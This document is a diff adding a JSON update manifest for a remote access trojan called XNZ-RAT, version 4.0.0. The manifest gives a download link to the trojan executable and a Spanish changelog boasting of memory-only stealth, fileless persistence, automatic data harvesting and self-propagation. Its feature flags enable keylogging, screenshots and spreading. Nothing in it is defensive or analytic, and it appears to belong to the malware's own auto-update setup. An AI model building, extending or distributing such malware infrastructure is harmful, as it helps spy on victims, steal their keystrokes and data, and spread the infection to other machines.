@@ -1,0 +1,17 @@
+{
+  "version": "4.0.0",
+  "download_url": "https://github.com/Xyraniz/XNZ-RAT/releases/download/v4.0/xnz_rat.exe",
+  "changelog": "Sistema memory-only | Comunicación stealth | Persistencia fileless | Auto-harvest | Auto-propagation | Auto-cleanup | Actualizaciones automáticas",
+  "features": {
+    "keylogger": true,
+    "screenshots": true,
+    "webcam": false,
+    "propagation": true,
+    "autoharvest": true,
+    "autocleanup": true,
+    "autoupdate": true,
+    "stealth_comms": true,
+    "memory_only": true,
+    "fileless_persistence": true
+  }
+}
